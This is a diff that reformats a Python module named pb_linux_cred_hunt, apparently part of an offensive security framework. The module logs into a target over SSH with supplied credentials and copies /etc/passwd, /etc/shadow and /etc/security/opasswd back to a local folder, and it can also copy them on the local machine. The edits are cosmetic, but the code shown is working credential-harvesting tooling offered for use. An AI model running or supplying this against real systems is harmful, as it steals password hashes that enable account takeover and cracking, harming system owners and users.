@@ -1,22 +1,22 @@
-#/modules/pb_linux_cred_hunt.py
+# /modules/pb_linux_cred_hunt.py
 import argparse
 from pathlib import Path
 
 # remote condition
 try:
     from modules.base import BaseModule
-    from core.utils.ssh_handler import *
+    from core.utils.ssh_handler import create_ssh_client
     from core.utils.formatter import printc
+
     IS_PEEKABOO = True
+
 except ImportError:
     IS_PEEKABOO = False
     print("Running Locally ...")
 
-TARGET_FILES = [
-    "/etc/passwd",
-    "/etc/shadow",
-    "/etc/security/opasswd"
-]
+
+TARGET_FILES = ["/etc/passwd", "/etc/shadow", "/etc/security/opasswd"]
+
 
 # DEF
 def fetch_and_save_file_local(src_path, dst_path):
@@ -28,6 +28,7 @@ def fetch_and_save_file_local(src_path, dst_path):
         print(f"[+] Saved: {dst_path}")
     except Exception as e:
         print(f"[!] Failed to copy {src_path}: {e}")
+
 
 def fetch_and_save_file_remote(ssh, remote_path, local_path):
     try:
@@ -41,12 +42,16 @@ def fetch_and_save_file_remote(ssh, remote_path, local_path):
     except Exception as e:
         printc(f"[!] Failed to fetch {remote_path}: {e}", level="error")
 
+
 class Module(BaseModule):
     def __init__(self):
         super().__init__()
 
         self.name = "pb_linux_cred_hunt"
-        self.description = "Extracts key Linux credential-related files such as /etc/shadow and /etc/passwd from the target via SSH."
+        self.description = (
+            "Extracts key Linux credential-related files "
+            "such as /etc/shadow and /etc/passwd from the target via SSH."
+        )
         self.category = "recon"
         self.author = "022NN"
         self.author_email = "n0220n@proton.me"
@@ -60,10 +65,11 @@ class Module(BaseModule):
             "rport": "22",
             "username": "",
             "password": "",
-            "output_dir": "./ch_output"
+            "output_dir": "./ch_output",
         }
 
-        # List of options that are considered required (shown in CLI with 'yes' under Required)
+        # List of options that are considered required
+        # (shown in CLI with 'yes' under Required)
         self.required_options = ["rhost", "rport", "username", "password"]
 
         self.options = self.default_options.copy()
@@ -83,7 +89,9 @@ class Module(BaseModule):
 
         try:
             printc(f"[*] Connecting to {host}:{port} ...", level="info")
-            ssh = create_ssh_client(host=host, port=port, username=username, password=password)
+            ssh = create_ssh_client(
+                host=host, port=port, username=username, password=password
+            )
         except Exception as e:
             printc(f"[*] SSH connection failed: {e}", level="error")
             return
@@ -109,4 +117,3 @@ if __name__ == "__main__" and not IS_PEEKABOO:
         filename = Path(path).name
         dst_path = output_dir / filename
         fetch_and_save_file_local(path, dst_path)
-
